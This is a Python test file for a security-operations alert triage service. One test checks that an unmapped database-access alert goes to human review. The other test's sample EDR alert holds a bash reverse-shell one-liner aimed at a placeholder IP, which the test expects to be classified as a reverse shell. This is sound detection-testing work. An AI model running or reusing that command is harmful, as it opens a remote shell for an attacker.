from __future__ import annotations

from soc_agent.contracts import (
    AlertClassification,
    AlertInput,
    AlertSourceRef,
    AlertSourceType,
    AnalysisRun,
    AnalysisRunStatus,
    DetectionRuleRef,
    SocDomainFindingDisposition,
    SocDomainName,
    SocDomainTriageRequest,
)
from soc_agent.domain import SocDomainTriageService


def test_domain_triage_preserves_unmapped_vendor_scenario_hint() -> None:
    alert = AlertInput(
        alert_id="ALT-UNMAPPED-SCENARIO",
        source=AlertSourceRef(source_type=AlertSourceType.SIEM, vendor="vendor-a", product="case-center"),
        detection=DetectionRuleRef(rule_name="Database sensitive table batch query", rule_category="数据安全"),
        classification=AlertClassification(category="数据库访问异常"),
        raw={"message": "应用账号在短时间内批量查询多张敏感表，需要结合工单和业务窗口核查。"},
    )
    run = AnalysisRun(
        run_id="RUN-UNMAPPED-SCENARIO",
        alert_id=alert.alert_id,
        status=AnalysisRunStatus.NEEDS_REVIEW,
        input_payload=alert.model_dump(mode="json"),
    )

    result = SocDomainTriageService().triage(
        SocDomainTriageRequest(
            run=run,
            domain=SocDomainName.GENERIC,
            metadata={"similar_alert_count": 1},
        )
    )

    scenario_findings = [finding for finding in result.findings if finding.scenario_key]
    assert len(scenario_findings) == 1
    finding = scenario_findings[0]
    assert finding.scenario_key == "vendor.unmapped"
    assert finding.disposition == SocDomainFindingDisposition.NEEDS_MORE_EVIDENCE
    assert "数据库访问异常" in finding.vendor_scenarios
    assert "数据安全" in finding.vendor_scenarios
    assert finding.current_conclusion.automation_allowed is False
    assert finding.current_conclusion.recommended_queue == "soc_review"
    assert finding.evidence_profile.sources["similar_alerts"] == "available"
    assert finding.metadata["taxonomy_candidate"] is True


def test_domain_triage_uses_internal_scenario_when_keyword_matches() -> None:
    alert = AlertInput(
        alert_id="ALT-REVERSE-SHELL",
        source=AlertSourceRef(source_type=AlertSourceType.EDR, vendor="vendor-a", product="endpoint"),
        detection=DetectionRuleRef(rule_name="Endpoint shell behavior", rule_category="未映射终端场景"),
        classification=AlertClassification(category="终端异常"),
        raw={"message": "bash -i >& /dev/tcp/203.0.113.10/4444 0>&1 reverse shell"},
    )
    run = AnalysisRun(
        run_id="RUN-REVERSE-SHELL",
        alert_id=alert.alert_id,
        status=AnalysisRunStatus.NEEDS_REVIEW,
        input_payload=alert.model_dump(mode="json"),
    )

    result = SocDomainTriageService().triage(SocDomainTriageRequest(run=run, domain=SocDomainName.EDR))

    scenario_keys = {finding.scenario_key for finding in result.findings if finding.scenario_key}
    assert "execution.reverse_shell" in scenario_keys
    assert "vendor.unmapped" not in scenario_keys
